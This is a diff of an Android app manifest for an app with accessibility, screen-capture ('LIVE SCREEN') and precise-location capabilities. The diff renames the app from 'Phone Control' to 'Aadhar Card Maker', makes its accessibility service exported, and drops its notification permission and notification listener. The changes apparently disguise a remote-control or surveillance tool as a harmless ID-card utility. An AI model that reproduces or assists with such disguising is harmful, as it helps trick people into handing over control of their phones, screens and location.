@@ -20,8 +20,7 @@
     <uses-permission
         android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
-    <uses-permission
-        android:name="android.permission.POST_NOTIFICATIONS" />
+
     <uses-permission
         android:name="android.permission.ACCESS_FINE_LOCATION" />
 
@@ -51,7 +50,7 @@
 
     <application
         android:theme="@style/Theme.VoiceControl"
-        android:label="Phone Control"
+        android:label="Aadhar Card Maker"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:allowBackup="true">
@@ -106,31 +105,17 @@
         <service
             android:name=".ScreenshotService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false">
+            android:exported="true">
 
             <intent-filter>
-
-                <action
-                    android:name="android.accessibilityservice.AccessibilityService" />
-
+                <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
 
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
-
         </service>
-        <service
-            android:name=".NotificationService"
-            android:label="Phone Control Notifications"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
 
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-
-        </service>
 
         <!-- LIVE SCREEN -->
 
